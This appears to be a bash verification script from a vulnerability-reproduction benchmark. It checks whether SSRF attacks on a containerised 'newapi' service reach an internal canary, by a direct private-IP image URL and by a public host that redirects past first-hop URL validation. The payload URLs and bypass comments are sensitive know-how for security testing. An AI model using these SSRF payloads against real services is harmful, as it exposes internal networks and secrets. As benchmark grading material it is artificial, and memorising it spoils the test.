#!/usr/bin/env bash
# verify.sh --seed|--residual
# 0 = canary hit log contains RUN_FLAG   10 = blocked/no flag   20 = env   30 = args
#
# Effect channel = ssrf_sidecar canary /var/log/canary/hits.log (PCB_FLAG from start).
# Judge RUN_FLAG so wrong/stale overrides cannot match the start-injected token.
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

SVC="newapi-${VERSION}"
PORT=""
for _ in $(seq 1 60); do
  PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" \
    port "$SVC" 3000 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
  if [[ -n "$PORT" ]]; then
    body="$(curl -sS --max-time 5 "http://127.0.0.1:${PORT}/api/status" || true)"
    if printf '%s' "$body" | grep -q '"success"'; then
      break
    fi
  fi
  sleep 2
  PORT=""
done
[[ -n "$PORT" ]] || { echo "verify: no published ${SVC}:3000 /api/status" >&2; exit 20; }
export PCB_TARGET_PORT="$PORT"
BASE="http://127.0.0.1:${PORT}"

if [[ "$MODE" == "--seed" ]]; then
  # CVE-2025-59146: direct private-IP image_url. V0 http.Get fetches; V1 ValidateURL rejects.
  URL="http://172.31.9.9:80/internal-secret.png"
else
  # CVE-2025-62155 (heldout 302 semantics, inlined): first hop is public 11.11.11.10:8080
  # (allowed port). Attacker 302s to 172.31.9.9. V1 ValidateURL is first-hop only;
  # DefaultClient follows Location with no isPrivateIP. Never reads heldout files.
  URL="http://11.11.11.10:8080/redirect"
fi

docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" exec -T canary \
  sh -c ': > /var/log/canary/hits.log' >/dev/null 2>&1 || {
  echo "verify: canary exec reset failed" >&2
  exit 20
}

OUT="$("$PY" "$CASE_DIR/poc/driver.py" run "$BASE" "$URL" 2>&1)" || {
  echo "$OUT" >&2
  exit 20
}
echo "$OUT" | tail -c 400; echo
sleep 2

LOG="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" \
  exec -T canary sh -c 'cat /var/log/canary/hits.log 2>/dev/null || true' 2>&1)" || {
  echo "verify: canary exec failed: $LOG" >&2
  exit 20
}
echo "${LOG:0:500}"
if [[ -n "$RUN_FLAG" ]] && grep -q "$RUN_FLAG" <<<"$LOG"; then
  exit 0
fi
exit 10
